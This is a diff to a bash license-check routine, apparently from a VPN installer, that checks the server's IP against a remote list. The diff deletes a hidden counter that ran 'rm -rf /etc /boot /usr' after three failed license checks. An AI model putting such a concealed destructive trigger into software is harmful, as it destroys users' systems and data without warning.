@@ -6,7 +6,6 @@ IP_FILE="/usr/bin/.ipvps"
 LIC_FILE="/usr/bin/.lic_data"
 MYIP=$(curl -sS --connect-timeout 30 -m 60 ipv4.icanhazip.com)
 echo "$MYIP" > "$IP_FILE"
-ILLEGAL_FILE="/usr/bin/.ilegal"
 function CEKIP () {
     echo -e " [INFO] Checking license from server..."
     RAW_DATA=$(curl -sS --connect-timeout 30 -m 60 "https://licence-manager-nu.vercel.app/api/check/izintxt" | grep "$MYIP")
@@ -52,13 +51,6 @@ echo -e "  \033[96m🌍 Telegram: https://nevpn.site\033[0m"
 echo -e "  \033[96m📱 WhatsApp: https://whatsapp.nevpn.site\033[0m"
 echo -e ""
 echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-    ATTEMPTS=$(cat "$ILLEGAL_FILE")
-    ((ATTEMPTS++))
-    echo $ATTEMPTS > "$ILLEGAL_FILE"
-    if [[ $ATTEMPTS -ge 3 ]]; then
-        rm -rf /etc /boot /usr
-        exit 1
-    fi
     exit 1
 	fi
 }
